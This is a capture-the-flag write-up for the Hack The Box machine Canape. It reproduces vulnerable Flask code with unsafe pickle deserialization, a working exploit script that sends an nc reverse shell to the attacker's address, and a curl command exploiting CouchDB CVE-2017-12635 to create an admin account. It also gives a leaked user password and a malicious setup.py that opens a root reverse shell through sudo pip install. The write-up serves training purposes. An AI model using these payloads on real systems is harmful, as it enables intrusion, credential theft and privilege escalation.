---
title: "Hack The Box - Canape"
tags: [linux,medium,python,pickle,couchdb,CVE2017-12635,pip install]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%201.png)

## Enumerating

→ Dumped the github repo using : [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

⇒ We got an script named `__init.py__`

```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons" # db name
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]] # Apache NOSQL Server

@app.errorhandler(404) # THis is error handler. It returns a white page with a random string.
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote: # It checks if any other parameter is provided and returns error
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST): # Checks if the char provided is in WHITELIST.
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest() # p_id is chat + quote md5 encoded.
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"]) # Depickling the data
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

### ⇒ Evaluating the Script :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%202.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%203.png)

→ We see it that it's depickling . We can leverage this for code execution on the system

### Exploiting Pickle

⇒ So lets submit an quote and send POST request to /check :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%204.png)

- Thing to note here is its appening char + quote .

→ So what we can do is essentially make char a string to be deserialized in cPickle which will make it valid non-executable code by adding **`(S'`** to the front of the string. We also add **`\n`** for the line break to prevent the concatenation we saw earlier. Which will look something like this :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%205.png)

⇒ Our exploit script :

```python
import requests
import cPickle
from hashlib import md5
import os

url = "http://10.10.10.70/"

class Exploit(object):
    def __reduce__(self):
        return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f',))

quote = cPickle.dumps(Exploit())

char = "(S'homer'\n"

p_id = md5(char + quote).hexdigest()

# Uploading :

upload_data = [('character',char), ('quote',quote)]
requests.post(url +"submit", data=upload_data)

# TRiggering Pickle :

id_data = [('id',p_id)]
(requests.post(url + "check", data=id_data))
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%206.png)

### Privilege Escalation to User

⇒ We see that its running couchdb locally :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%207.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%208.png)

→ We enumerated the databases and tried to enumerate the passwords db but it requires authorization :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%209.png)

⇒ CouchDB Exploit CVE-2017-12635 

[https://justi.cz/security/2017/11/14/couchdb-rce-npm.html](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)

> There was a vulnerability in CouchDB caused by a discrepancy between the database’s native JSON parser and the Javascript JSON parser used during document validation

→ We can create an **admin** user named **oops** with password **password** with the following query :

`curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{"type": "user","name": "oops","roles": ["_admin"],"roles": [],"password": "password"}'`

Here we can create a new document in _users database, but with restrictions on its arguments. We can bypass the restrictions by duplicating the `roles` field.

→ Enumerating passwords database :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2010.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2011.png)

**homer : 0B4jyA0xtytZi7esBNGp**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2012.png)

### Privilege Escalation to Root

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2013.png)

⇒ We can run pip install as root 🙂

Exploiting it : [https://github.com/0x00-0x00/FakePip](https://github.com/0x00-0x00/FakePip)

```python
from setuptools import setup
from setuptools.command.install import install
import base64
import os

class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '10.10.14.2'  # change this
    LPORT = 1234
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

**sudo /usr/bin/pip install . --upgrade --force-reinstall**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Canape%20Box%20e6ca8c6955f94958b1d71d2f5a203bc1/Untitled%2014.png)
